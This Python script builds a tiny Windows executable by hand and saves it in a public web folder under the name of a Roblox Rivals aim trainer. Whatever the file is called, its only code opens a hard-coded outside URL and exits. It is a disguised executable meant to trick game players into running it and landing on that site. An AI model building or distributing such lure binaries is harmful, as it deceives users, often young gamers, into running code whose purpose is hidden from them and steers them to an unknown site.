#!/usr/bin/env python3
import struct
import os

def build_pe():
    # Target URL to open on Windows
    url = b"https://ais-pre-tmdlryr5lmihfvkdedvpek-25284434358.asia-east1.run.app\0"
    operation = b"open\0"

    # RVAs:
    # Header size: 0x200 (in file), VirtualSize: 0x1000
    # Section 1 (.text): RVA 0x1000, File Offset 0x200
    # Section 2 (.rdata): RVA 0x2000, File Offset 0x400 (contains imports & strings)

    # In .rdata (RVA 0x2000):
    # Offset 0x00: Import Directory Table (IDT)
    #   Descriptor 1: KERNEL32.DLL
    #   Descriptor 2: SHELL32.DLL
    #   Descriptor 3: Null descriptor (20 bytes)
    # Offset 0x3C: IAT (Import Address Table)
    #   KERNEL32 IAT: [RVA of HintName ExitProcess], [0]
    #   SHELL32 IAT: [RVA of HintName ShellExecuteA], [0]
    # Offset 0x50: ILT (Import Lookup Table) - duplicate of IAT
    # Offset 0x64: Hint/Name Table
    # Offset 0x90: DLL names ("KERNEL32.DLL", "SHELL32.DLL")
    # Offset 0xB0: Strings (operation="open", url="https://...")

    # Let's organize .rdata layout cleanly:
    # 0x00: IDT (3 * 20 bytes = 60 bytes, 0x00 - 0x3C)
    # 0x3C: KERNEL32 IAT (8 bytes: [HintName ExitProcess RVA, 0])
    # 0x44: SHELL32 IAT (8 bytes: [HintName ShellExecuteA RVA, 0])
    # 0x4C: KERNEL32 ILT (8 bytes: [HintName ExitProcess RVA, 0])
    # 0x54: SHELL32 ILT (8 bytes: [HintName ShellExecuteA RVA, 0])
    # 0x5C: HintName ExitProcess: 2 bytes hint + b"ExitProcess\0" (14 bytes)
    # 0x6A: HintName ShellExecuteA: 2 bytes hint + b"ShellExecuteA\0" (16 bytes)
    # 0x7A: "KERNEL32.DLL\0" (13 bytes)
    # 0x87: "SHELL32.DLL\0" (12 bytes)
    # 0x93: "open\0" (5 bytes)
    # 0x98: url (len(url) bytes)

    rdata_rva = 0x2000

    offset_idt = 0x00
    offset_k32_iat = 0x3C
    offset_shell_iat = 0x44
    offset_k32_ilt = 0x4C
    offset_shell_ilt = 0x54
    offset_hint_exit = 0x5C
    offset_hint_shellex = 0x6A
    offset_k32_dll = 0x7A
    offset_shell_dll = 0x87
    offset_op = 0x94
    offset_url = 0x9A

    rdata = bytearray(0x200)

    # KERNEL32 IDT Entry (20 bytes)
    # OriginalFirstThunk (ILT RVA), TimeDateStamp (0), ForwarderChain (0), Name RVA, FirstThunk (IAT RVA)
    struct.pack_into("<IIIII", rdata, offset_idt,
                     rdata_rva + offset_k32_ilt,
                     0, 0,
                     rdata_rva + offset_k32_dll,
                     rdata_rva + offset_k32_iat)

    # SHELL32 IDT Entry (20 bytes)
    struct.pack_into("<IIIII", rdata, offset_idt + 20,
                     rdata_rva + offset_shell_ilt,
                     0, 0,
                     rdata_rva + offset_shell_dll,
                     rdata_rva + offset_shell_iat)

    # Null IDT Entry (20 bytes at offset_idt + 40 is already 0)

    # IAT and ILT entries
    rva_hint_exit = rdata_rva + offset_hint_exit
    rva_hint_shellex = rdata_rva + offset_hint_shellex

    struct.pack_into("<II", rdata, offset_k32_iat, rva_hint_exit, 0)
    struct.pack_into("<II", rdata, offset_shell_iat, rva_hint_shellex, 0)
    struct.pack_into("<II", rdata, offset_k32_ilt, rva_hint_exit, 0)
    struct.pack_into("<II", rdata, offset_shell_ilt, rva_hint_shellex, 0)

    # Hint / Name table
    # Hint (2 bytes: 0), Name + \0
    rdata[offset_hint_exit + 2 : offset_hint_exit + 2 + len(b"ExitProcess\0")] = b"ExitProcess\0"
    rdata[offset_hint_shellex + 2 : offset_hint_shellex + 2 + len(b"ShellExecuteA\0")] = b"ShellExecuteA\0"

    # DLL names
    rdata[offset_k32_dll : offset_k32_dll + len(b"KERNEL32.DLL\0")] = b"KERNEL32.DLL\0"
    rdata[offset_shell_dll : offset_shell_dll + len(b"SHELL32.DLL\0")] = b"SHELL32.DLL\0"

    # Strings
    rdata[offset_op : offset_op + len(b"open\0")] = b"open\0"
    rdata[offset_url : offset_url + len(url)] = url

    # Code in .text (RVA 0x1000):
    # ShellExecuteA(HWND hwnd=0, LPCSTR lpOperation="open", LPCSTR lpFile=url, LPCSTR lpParameters=0, LPCSTR lpDirectory=0, INT nShowCmd=SW_SHOWNORMAL=1)
    # stdcall: push 1, push 0, push 0, push url, push "open", push 0, call [ShellExecuteA]
    # ExitProcess(0)
    # push 0, call [ExitProcess]

    image_base = 0x00400000
    addr_shellex_iat = image_base + rdata_rva + offset_shell_iat
    addr_exit_iat = image_base + rdata_rva + offset_k32_iat
    addr_op = image_base + rdata_rva + offset_op
    addr_url = image_base + rdata_rva + offset_url

    code = bytearray()
    # push 1 (SW_SHOWNORMAL) -> 6A 01
    code += b"\x6A\x01"
    # push 0 (lpDirectory) -> 6A 00
    code += b"\x6A\x00"
    # push 0 (lpParameters) -> 6A 00
    code += b"\x6A\x00"
    # push addr_url -> 68 [4 bytes]
    code += b"\x68" + struct.pack("<I", addr_url)
    # push addr_op -> 68 [4 bytes]
    code += b"\x68" + struct.pack("<I", addr_op)
    # push 0 (hwnd) -> 6A 00
    code += b"\x6A\x00"
    # call dword ptr [addr_shellex_iat] -> FF 15 [4 bytes]
    code += b"\xFF\x15" + struct.pack("<I", addr_shellex_iat)
    # push 0 (exit code) -> 6A 00
    code += b"\x6A\x00"
    # call dword ptr [addr_exit_iat] -> FF 15 [4 bytes]
    code += b"\xFF\x15" + struct.pack("<I", addr_exit_iat)
    # ret
    code += b"\xC3"

    text = bytearray(0x200)
    text[:len(code)] = code

    # Headers (0x200 bytes):
    hdr = bytearray(0x200)

    # DOS Header:
    # e_magic = 'MZ'
    hdr[0:2] = b"MZ"
    # e_lfanew at 0x3C = 0x80
    struct.pack_into("<I", hdr, 0x3C, 0x80)

    # DOS stub
    hdr[0x40:0x4E] = b"This program cannot be run in DOS mode.\r\r\n$"

    # PE Header at 0x80:
    pe_offset = 0x80
    hdr[pe_offset:pe_offset+4] = b"PE\0\0"

    # COFF File Header (20 bytes) at 0x84:
    # Machine = 0x014C (i386)
    # NumberOfSections = 2 (.text, .rdata)
    # TimeDateStamp = 0x66FA0000
    # PointerToSymbolTable = 0
    # NumberOfSymbols = 0
    # SizeOfOptionalHeader = 224 (0xE0)
    # Characteristics = 0x0102 (EXECUTABLE_IMAGE | 32BIT_MACHINE)
    struct.pack_into("<HHIIIHH", hdr, pe_offset + 4,
                     0x014C, 2, 0x66FA0000, 0, 0, 0xE0, 0x0102)

    # Optional Header at 0x98 (224 bytes):
    # Magic = 0x010B (PE32)
    # MajorLinkerVersion = 6, MinorLinkerVersion = 0
    # SizeOfCode = 0x200
    # SizeOfInitializedData = 0x200
    # SizeOfUninitializedData = 0
    # AddressOfEntryPoint = 0x1000 (.text start)
    # BaseOfCode = 0x1000
    # BaseOfData = 0x2000
    opt_offset = pe_offset + 24
    struct.pack_into("<HBBIIIIII", hdr, opt_offset,
                     0x010B, 6, 0, 0x200, 0x200, 0, 0x1000, 0x1000, 0x2000)

    # Windows-specific fields at opt_offset + 28:
    # ImageBase = 0x00400000
    # SectionAlignment = 0x1000
    # FileAlignment = 0x200
    # MajorOperatingSystemVersion = 5, MinorOperatingSystemVersion = 1
    # MajorImageVersion = 0, MinorImageVersion = 0
    # MajorSubsystemVersion = 5, MinorSubsystemVersion = 1
    # Win32VersionValue = 0
    # SizeOfImage = 0x3000
    # SizeOfHeaders = 0x200
    # CheckSum = 0
    # Subsystem = 2 (IMAGE_SUBSYSTEM_WINDOWS_GUI)
    # DllCharacteristics = 0x8140
    # SizeOfStackReserve = 0x100000, SizeOfStackCommit = 0x1000
    # SizeOfHeapReserve = 0x100000, SizeOfHeapCommit = 0x1000
    # LoaderFlags = 0
    # NumberOfRvaAndSizes = 16
    struct.pack_into("<IIIIHHHHHHIIIIHHIIIIII", hdr, opt_offset + 28,
                     image_base, 0x1000, 0x200,
                     5, 1, 0, 0, 5, 1, 0,
                     0x3000, 0x200, 0, 2, 0x8140,
                     0x100000, 0x1000, 0x100000, 0x1000, 0, 16)

    # Data Directories (16 entries * 8 bytes):
    # Entry 1 (Import Table): RVA = 0x2000, Size = 60 (0x3C)
    # Entry 12 (IAT): RVA = 0x2000 + offset_k32_iat, Size = 16
    dd_offset = opt_offset + 96
    # Directory 1 (Imports) is at dd_offset + 8:
    struct.pack_into("<II", hdr, dd_offset + 8, rdata_rva, 60)
    # Directory 12 (IAT) is at dd_offset + 96:
    struct.pack_into("<II", hdr, dd_offset + 96, rdata_rva + offset_k32_iat, 16)

    # Section Headers (40 bytes each) at opt_offset + 224 = 0x178:
    sec_offset = opt_offset + 224

    # Section 1: .text (40 bytes)
    # Name: ".text\0\0\0"
    # VirtualSize = 0x200, VirtualAddress = 0x1000
    # SizeOfRawData = 0x200, PointerToRawData = 0x200
    # PointerToRelocations = 0, PointerToLinenumbers = 0, NumberOfRelocations = 0, NumberOfLinenumbers = 0
    # Characteristics = 0x60000020 (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ)
    hdr[sec_offset:sec_offset+8] = b".text\0\0\0"
    struct.pack_into("<IIIIIIHHI", hdr, sec_offset + 8,
                     0x200, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0x60000020)

    # Section 2: .rdata (40 bytes)
    # Name: ".rdata\0\0"
    # VirtualSize = 0x200, VirtualAddress = 0x2000
    # SizeOfRawData = 0x200, PointerToRawData = 0x400
    # Characteristics = 0x40000040 (IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ)
    sec2_offset = sec_offset + 40
    hdr[sec2_offset:sec2_offset+8] = b".rdata\0\0"
    struct.pack_into("<IIIIIIHHI", hdr, sec2_offset + 8,
                     0x200, 0x2000, 0x200, 0x400, 0, 0, 0, 0, 0x40000040)

    # Assemble complete PE binary:
    pe_binary = hdr + text + rdata

    os.makedirs("./public", exist_ok=True)
    out_path = "./public/Roblox_Rivals_RANGE_Aim_Trainer.exe"
    with open(out_path, "wb") as f:
        f.write(pe_binary)

    # Also save as RANGE_Aim_Trainer.exe for flexibility
    with open("./public/RANGE_Aim_Trainer.exe", "wb") as f:
        f.write(pe_binary)

    print(f"Successfully generated {out_path} ({len(pe_binary)} bytes)")

if __name__ == "__main__":
    build_pe()
